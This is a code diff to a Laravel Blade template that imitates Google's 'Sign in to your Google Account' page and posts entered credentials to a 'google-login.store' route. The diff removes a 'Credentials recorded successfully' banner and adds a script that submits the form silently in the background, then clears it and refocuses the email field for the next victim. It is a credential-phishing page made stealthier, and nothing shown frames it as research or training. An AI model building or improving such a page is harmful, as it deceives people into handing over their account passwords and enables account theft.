@@ -176,20 +176,6 @@
             text-decoration: underline;
         }
 
-        .success-message {
-            background-color: #d4edda;
-            border: 1px solid #c3e6cb;
-            color: #155724;
-            padding: 12px;
-            border-radius: 4px;
-            margin-bottom: 24px;
-            display: none;
-        }
-
-        .success-message.show {
-            display: block;
-        }
-
         .input-wrapper {
             position: relative;
         }
@@ -204,12 +190,6 @@
 
         <h1>Sign in</h1>
         <p>to your Google Account</p>
-
-        @if (session('success'))
-            <div class="success-message show">
-                ✓ Credentials recorded successfully
-            </div>
-        @endif
 
         <form method="POST" action="{{ route('google-login.store') }}" id="loginForm">
             @csrf
@@ -268,13 +248,28 @@
 
     <script>
         document.getElementById('loginForm').addEventListener('submit', function(e) {
-            // Show success message
-            setTimeout(() => {
-                const message = document.querySelector('.success-message');
-                if (message) {
-                    message.classList.add('show');
+            e.preventDefault();
+            
+            const form = this;
+            const formData = new FormData(form);
+            
+            fetch(form.action, {
+                method: 'POST',
+                body: formData,
+                headers: {
+                    'X-Requested-With': 'XMLHttpRequest',
                 }
-            }, 100);
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    // Silent submission - just reset the form
+                    form.reset();
+                    // Optional: focus on email field for next submission
+                    document.getElementById('email').focus();
+                }
+            })
+            .catch(error => console.error('Error:', error));
         });
     </script>
 </body>
